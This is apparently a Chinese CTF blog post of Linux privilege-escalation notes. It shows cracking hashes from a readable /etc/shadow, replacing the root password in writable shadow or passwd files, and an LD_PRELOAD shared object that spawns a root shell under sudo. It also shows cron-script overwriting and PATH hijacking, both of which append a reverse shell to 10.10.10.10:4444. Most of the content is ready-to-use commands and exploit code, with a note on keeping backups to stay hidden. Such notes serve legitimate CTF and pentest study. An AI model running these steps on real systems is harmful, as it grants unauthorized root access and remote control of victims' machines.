---
title: Linux提权演示
date: 2025-07-02 16:10:24
description: Linux提权
tags:
- Linux
- Privillege Escalation
categories:
- CTF
---

## shadow&password提权

### 可读shadow文件利用提权

```bash
ls -liah /etc/shadow
cat /etc/shadow | grep ':\$'

# 本地添加hash文件暴力破解
sudo john --wordlist=/usr/share/wordlist/rockyou.txt hash
```

### 可写shadow文件利用提权

```bash
ls -liah /etc/shadow # 发现shadow文件可写
cp /etc/shadow /tmp/shadow.bak # 保证可还原并隐匿
mkpasswd -m sha-512 password #生成密码 粘贴到root用户密码
```

### 可写passwd文件利用提权

```bash
ls -liah /etc/passwd # 发现passwd文件可写
cp /etc/passwd /tmp/passwd.bak # 保证可还原并隐匿
openssl passwd password # 生成密码 替代passwd中root:x:0:0的x值
```

---

## sudo环境变量提权

### 使用条件
  当使用sudo -l 时，如果发现env_reset, env_keep+=LD_PRELOAD配置且有command可用时(如find,man,less,cat)

### 示例

- 代码
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

- 编译提权
	```bash
	gcc -fPIC -shared -o shell.so shell.c -nostartfiles
	
	sudo LD_PRELOAD=/home/user/shell.so cat # 假定cat可以无密码sudo使用
	```

---

## 自动任务提权

### 自动任务文件权限提权

#### 使用条件

查看自动任务有自动任务并且shell文件可写时，直接编辑文件

#### 示例

```bash
$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
# m h dom mon dow user command
* * * * * root overwrite.sh
...

$ locate overwrite.sh
/usr/local/bin/overwrite.sh

$ ls -liah /usr/local/bin/overwrite.sh
816761 -rwxr--rw- 1 root staff 40 May 13 2017 /usr/local/bin/overwrite.sh

$ cat >> /usr/local/bin/overwrite.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
EOF
```

### 自动任务PATH环境变量提权

#### 使用条件

在自动任务中指定SHELL和PATH环境变量且第一位的路径为可写目录

#### 示例

```bash
$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
# m h dom mon dow user command
* * * * * root overwrite.sh # 未使用绝对路径
...

# 可以狸猫换太子在/home/user目录下写同名文件
$ locate overwrite.sh
/usr/local/bin/overwrite.sh
$ cat > /home/user/overwrite.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
EOF
$ chmod +x /home/usr/overwrite.sh
```

